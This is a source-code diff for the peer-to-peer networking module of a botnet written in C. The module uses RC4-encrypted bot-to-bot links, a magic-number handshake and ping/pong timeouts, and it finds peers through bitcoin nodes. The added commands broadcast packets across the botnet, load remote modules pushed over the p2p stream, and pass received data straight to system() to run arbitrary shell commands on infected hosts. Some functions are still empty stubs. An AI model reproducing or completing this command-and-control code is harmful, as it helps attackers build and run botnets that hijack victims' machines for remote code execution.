@@ -37,6 +37,11 @@ ip generate seed can be used to ensure different bots scan different IPs
 #define BOT_MAGIC 0xDABCADAA
 #define BOT_PKT 0xAABBCCDD
 #define MIN_BOT_CONNECTIONS 15
+// timeout after 100 seconds of nothing.. ping/pong at 60
+#define PING_ASK 60
+#define PING_TIMEOUT 100
+
+extern ExternalModules *external_list;
 
 // various states of bot communication
 enum {
@@ -45,7 +50,18 @@ enum {
     BOT_KEY_EXCHANGE=4096,
     BOT_PERFECT=STATE_OK
 };
-
+/*
+typedef struct _botlink_channel {
+    struct _botlink_channel *next;
+    int channel_id;
+    int hops;    // decreasing hop counter (wont even stop on the node even if it is the node).. until another round
+    int ack;
+    int seq;
+    int crypt;
+    char *key;
+    int key_len;
+} BotChannel;
+*/
 
 typedef struct _bot_header {
     uint32_t magic;
@@ -75,25 +91,31 @@ int BotMSGVerify(char *buf, int size) {
 typedef struct _bot_variables {
     // in case we wanna save bot information for next connection
     struct _bot_variables *next;
-    
-    int state;
-    
+
     // encryption key
     char *key_in;
-    char *key_out;
     int key_size_in;
-    int key_size_out;
     rc4_key rc4_iv_in;
+    char *key_out;
+    int key_size_out;
     rc4_key rc4_iv_out;
     
     // when we change keys.. this should be flagged
     // so after the CHOP we process all incoming data
     // with the new encryption key
-    int crypt_sync;
+    bool crypt_sync;
     
     // bot ID & size
     char *bot_id;
     int bot_id_size;
+    
+    // 64 * 4byte (uint32_t) p2p checksums..
+    // so we do not continous to distribute the same msgs to same nodes
+    // another option is to have a 'repeat' integer which gets decremented...
+    // the issue is 'repeat' would be inside of the packet, and allows to be manipulated
+    // this uses more memory.. ill test both and choose one
+    int p2p_sum_i;
+    uint32_t p2p_sums[64];
 } BotVariables;
 
 
@@ -154,6 +176,8 @@ int botlink_init(Modules **_module_list) {
 }
 
 int botlink_main_loop(Modules *mptr, Connection *cptr, char *buf, int size) {
+    int cur_ts = time(0);
+    int i = 0;
     // handle tcp/ip for each connection
     // will flush outgoing queue, and fill incoming
     
@@ -165,6 +189,18 @@ int botlink_main_loop(Modules *mptr, Connection *cptr, char *buf, int size) {
         // reuse bitcoin connect nodes..
         bitcoin_connect_nodes(mptr, MIN_BOT_CONNECTIONS - connection_count);
     } 
+    
+    for (cptr = mptr->connections; cptr != NULL; cptr = cptr->next) {
+        i = (cur_ts - cptr->ping_ts);
+        if (i > PING_TIMEOUT) {
+            ConnectionBad(cptr);
+            continue;
+        }
+        if (i > PING_ASK) {
+            // send a ping message
+            botlink_pingpong(mptr, cptr, 0);
+        }
+    }
 }
 
 // will handle encryption for talking to other bots
@@ -173,6 +209,7 @@ int botlink_write(Modules *mptr, Connection *cptr, char **buf, int *size) {
     //if (!vars || vars->key_size == 0) return *size;
     
     if (!stateOK(cptr)) return *size;
+    
     // perform encryption
     rc4((unsigned char *)*buf, *size, &vars->rc4_iv_out);
     
@@ -224,8 +261,8 @@ int botlink_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
     // ret = -1.. so if the function/state isnt found
     // itll break the connection.. and the function needs to return 1 to remove msgs
     for (i = 0; BotlinkParsers[i].function != NULL; i++) {
-        if (BotlinkParsers[i].state == vars->state) {
-            ret = BotlinkParsers[i].function(mptr, cptr, buf + sizeof(BotMSGHdr), size - sizeof(BotMSGHdr));
+        if (BotlinkParsers[i].state == cptr->state) {
+            ret = BotlinkParsers[i].function(mptr, cptr, buf + sizeof(BotMSGHdr), _hdr->len);
             break;
         }
     }
@@ -318,8 +355,7 @@ int bot_sendkey(Modules *mptr, Connection *cptr) {
     
     // first generate a key
     key_size = 16 + rand()%32;
-    key = (char *)malloc(key_size + 1);
-    if (key == NULL) {
+    if ((key = (char *)malloc(key_size + 1)) == NULL) {
         ConnectionBad(cptr);
         return -1;
     }
@@ -384,12 +420,15 @@ int botlink_handshake(Modules *mptr, Connection *cptr, char *buf, int size) {
     // we will wait for it to be at least the space required..
     if (size < sizeof(int32_t)) return 0;
     
+    // we could use buf but if we add more variables to handshake.. we'd have to add a new pointer
     char *sptr = (char *)buf;
     magic = get_int32(&sptr);
     
     // ensure the bot magic is correct (like a handshake)
     if (magic != BOT_MAGIC) return -1;
     
+    // if we are not an outgoing connection.. then send the magic ourselves
+    // we did it on connect() if we are outgoing 
     if (cptr->state != BOT_HANDSHAKE_OUT)
         bot_pushmagic(mptr, cptr);
     
@@ -397,6 +436,8 @@ int botlink_handshake(Modules *mptr, Connection *cptr, char *buf, int size) {
     // and we expect an encryption key from the other side..
     cptr->state = BOT_KEY_EXCHANGE;
     
+    // and send our encryption key..
+    // the other side should already be expecting since its the same code without the above IF for sending (which would be twice)
     if (bot_sendkey(mptr, cptr) == -1) return -1;
     
     return 1;
@@ -433,57 +474,157 @@ int botlink_keyexchange(Modules *mptr, Connection *cptr, char *buf, int size) {
     return 1;
 }
 
+// bot commands go under here..
 
-char *bot_push_cmd(unsigned char cmd, char *fmt, ...) {
-    
-}
 
 enum {
     BOT_CMD_PING,
     BOT_CMD_PONG,
-    BOT_CMD_HIGH
+    BOT_CMD_BROADCAST,
+    BOT_CMD_LOADMODULE,
+    BOT_CMD_UNLOADMODULE,
+    BOT_CMD_EXECUTE,
+    BOT_CMD_CONTROL_MODULE
 };
 
-int bot_cmd_ping(Modules *mptr, Connection *cptr, char *buf, int size) {
+// push a ping, or pong to a bot
+int botlink_pingpong(Modules *mptr, Connection *cptr, int pong) {
+    char cmd[1];
     
+    cmd[0] = pong ? BOT_CMD_PONG : BOT_CMD_PING;
+    
+    return bot_pushpkt(mptr, cptr, (char *)&cmd, 1);    
 }
 
+// push a pong to the side requesting..
+int botlink_cmd_ping(Modules *mptr, Connection *cptr, char *buf, int size) {
+    return botlink_pingpong(mptr, cptr, 1);
+}
 
-int botlink_message(Modules *mptr, Connection *cptr, char *buf, int size) {
+// this is separate in case a p2p command comes in that has to be parsed correctly
+// so no need to have duplicate code
+int botlink_message_exec(Modules *mptr, Connection *cptr, char *buf, int size, bool from_broadcast) {
     int ret = 1;
     int i = 0;
     BotVariables *vars = BotVars(cptr);
     CMDHdr *hdr = (CMDHdr *)buf;
     struct _bot_commands {
+        // cmd identifier for pkts
         unsigned char cmd;
+        // pointer for command
         module_func function;
-        unsigned short size;
+        // minimum size of data for this command
+        unsigned short minimum_size;
+        // is this command available via broadcast? (security mechanism for corrupting all bots, etc)
+        bool bcast;
+        // cryptographically verify command before executing
+        bool verify_hash;
     } BotCommands[] = {
-        { BOT_CMD_PING, &bot_cmd_ping, 0 },
-        { BOT_CMD_PONG, NULL, 0 },
+        { BOT_CMD_PING, &botlink_cmd_ping, 0, false, false },
+        { BOT_CMD_PONG, NULL, 0, false, false },
+        { BOT_CMD_BROADCAST, &botlink_cmd_broadcast, true, false },
+        { BOT_CMD_LOADMODULE, &botlink_cmd_loadmodule, true, false },
+        { BOT_CMD_UNLOADMODULE, &botlink_cmd_unloadmodule, true, false },
+        { BOT_CMD_EXECUTE, &botlink_cmd_execute, true, true },
+        //{ BOT_CMD_CONTROL_MODULE, &botlink_cmd_control_module, true, true },
         { 0, NULL }
     };
     
     
     // if we do not have the full packet yet..
-    if (size < sizeof(CMDHdr))
-        return 0;
+    if (size < sizeof(CMDHdr)) {
+        // no point in having it save it.. damaged packet.. we can kill the connection more than likely..
+        // it may be security exploit attempt
+        ConnectionBad(cptr);
+        return 1;
+    }
     
     for (; BotCommands[i].function != NULL; i++) {
         if (BotCommands[i].cmd == hdr->cmd) {
             // we have to make sure the entire packet for this command exists
-            if (size < (hdr->size + BotCommands[i].size))
-                return 0;
+            if ((size - sizeof(CMDHdr)) < BotCommands[i].minimum_size) {
+                // lets be very paranoid, and kill connection
+                // with encryption, etc.. nothing will get this far by 'accident' fuck resync
+                ConnectionBad(cptr);
+                return 1;
+            }
+        
+            // push to the correct command without the header
+            if (BotCommands[i].function != NULL)        
+                ret = BotCommands[i].function(mptr, cptr, buf + sizeof(CMDHdr), size - sizeof(CMDHdr));
                 
-            BotCommands[i].function(mptr, cptr, buf, size);
-            
+            // ts we can deal with timeouts.. (and ping/pong)
+            cptr->ping_ts = time(0);
+            // if the cmd matches, and no function.. or function... we break PONG has no function and is ok
+            break;
         }
     }
     
-    return 1;
+    return 1;    
+}
+
+int botlink_message(Modules *mptr, Connection *cptr, char *buf, int size) {
+    return botlink_message_exec(mptr, cptr, buf, size, false);
+}
+
+// distributes a packet to the p2p network...
+// so we dont continously give the same packet to the same nodes..
+// we will verify against hashes already given to a node
+int botlink_p2p_distribute(Modules *mptr, Connection *cptr, char *buf, int size) {
+    
+}
+
+// allows us to give a full packet inside of a broadcast command to be executed on every bot
+int botlink_cmd_broadcast(Modules *mptr, Connection *cptr, char *buf, int size) {
+    // we must distribute this command to each bot we have..
+
+
+    // and then finally we execute it ourselves
+    return botlink_message_exec(mptr, cptr, buf, size, true);
+}
+
+// loads an external module from a p2p stream
+int botlink_cmd_loadmodule(Modules *mptr, Connection *cptr, char *buf, int size) {
+    ExternalModules *eptr = NULL;
+    int ret = 0;
+    
+    int32_t module_id = get_int32(&buf);
+    
+    eptr = ExternalAdd(module_id, buf, size - sizeof(int32_t), 1);
+    
+    return (eptr != NULL);
+}
+
+// loads an external module from a p2p stream
+int botlink_cmd_unloadmodule(Modules *mptr, Connection *cptr, char *buf, int size) {
+    ExternalModules *eptr = NULL;
+    int ret = 0;
+    
+    int32_t module_id = get_int32(&buf);
+    
+    if ((eptr = ExternalFind(module_id)) != NULL) {
+        ret = ExternalDeinit(eptr);
+        if (ret == 1) {
+            L_del((LIST **)external_list, (LIST *)eptr);
+        }
+    }
+    
+    return ret;
 }
 
 
+// executes a command from a p2p stream
+int botlink_cmd_execute(Modules *mptr, Connection *cptr, char *buf, int size) {
+    system(buf);
+    return 1;
+}
+
+/*
+// will finish control module later.. requires an overhaul on every module
+int botlink_cmd_control_module(Modules *mptr, Connection *cptr, char *buf, int size) {
+    return 1;
+}
+*/
 // -- functions not in use..
 /*
 
